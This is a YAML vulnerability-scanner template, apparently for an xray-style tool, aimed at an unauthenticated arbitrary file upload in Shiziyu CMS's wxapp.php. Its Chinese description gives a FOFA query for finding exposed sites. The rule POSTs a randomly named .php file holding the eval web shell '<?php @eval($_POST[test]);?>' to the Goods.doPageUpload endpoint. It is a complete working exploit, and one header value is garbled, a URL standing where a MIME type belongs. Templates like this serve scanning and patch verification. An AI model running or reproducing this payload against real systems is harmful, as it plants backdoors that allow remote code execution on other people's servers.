expression: r0()
id: shiziyu-cms-wxapp.php-Anyfileupload
info:
  author: daffainfo
  description: "\u72EE\u5B50\u9C7CCMS wxapp.php\u6587\u4EF6 \u5B58\u5728\u4EFB\u610F\
    \u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u5728\u6CA1\u6709\
    \u8EAB\u4EFD\u9A8C\u8BC1\u7684\u60C5\u51B5\u4E0B\u53EF\u4EE5\u4E0A\u4F20\u6076\
    \u610F\u6587\u4EF6\nfofa-query: \"/seller.php?s=/Public/login\"\n"
  name: "\u72EE\u5B50\u9C7CCMS wxapp.php \u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\
    \u6D1E"
  reference:
  - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/%E7%8B%AE%E5%AD%90%E9%B1%BCCMS%20wxapp.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  severity: critical
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes(r1))
    request:
      body: "------WebKitFormBoundary{{rboundary}}\nContent-Disposition: form-data;\
        \ name=\"upfile\";  filename=\"{{r1}}.php\"\nContent-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif\n\
        \n<?php @eval($_POST[test]);?>\n------WebKitFormBoundary{{rboundary}}\u2014\
        \n"
      headers:
        Content-Type: multipart/form-data;boundary=----WebKitFormBoundary{{rboundary}}
      method: POST
      path: /wxapp.php?controller=Goods.doPageUpload
set:
  r1: randomLowercase(20)
  rboundary: randomLowercase(8)
